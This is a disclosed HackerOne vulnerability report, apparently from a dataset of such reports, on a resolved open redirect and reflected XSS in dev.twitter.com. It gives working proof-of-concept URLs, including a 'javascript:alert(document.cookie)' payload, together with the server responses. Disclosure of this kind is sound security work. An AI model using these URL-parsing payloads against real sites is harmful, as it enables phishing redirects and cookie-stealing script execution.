---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '260744'
original_report_id: '260744'
title: '[dev.twitter.com] XSS and Open Redirect'
team_handle: x
created_at: '2017-08-16T16:30:43.579Z'
disclosed_at: '2017-09-29T23:07:42.313Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 68
tags:
- hackerone
---

# [dev.twitter.com] XSS and Open Redirect

## Metadata

- HackerOne Report ID: 260744
- Weakness: 
- Program: x
- Disclosed At: 2017-09-29T23:07:42.313Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Description
===
XSS via Request-URI which requires user interaction. The vulnerability is caused by the difference in the Request-URI processing in the Location header and in the link on the page.
By creating an incorrect port in the link on the Location header, you can block the redirection for the FireFox browser. Next, using the difference in the processing, generate a "javascript" link on the page.

PoC: Open Redirect
===
Browsers: Chrome, FireFox, Opera
```
https://dev.twitter.com/https:/%5cblackfan.ru/
```
HTTP Response:
```http
HTTP/1.1 302 Found
connection: close
...
location: https:/\blackfan.ru
```

PoC: XSS
===
Browsers: FireFox
Steps to reproduce: Open and click the link
```
https://dev.twitter.com//x:1/:///%01javascript:alert(document.cookie)/
```
HTTP Response:
```http
HTTP/1.1 302 Found
connection: close
...
location: //x:1/://dev.twitter.com/javascript:alert(document.cookie)
...


<p>You should be redirected automatically to target URL: <a href="javascript:alert(document.cookie)">javascript:alert(document.cookie)</a>.  If not click the link.
```
{F213436}

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
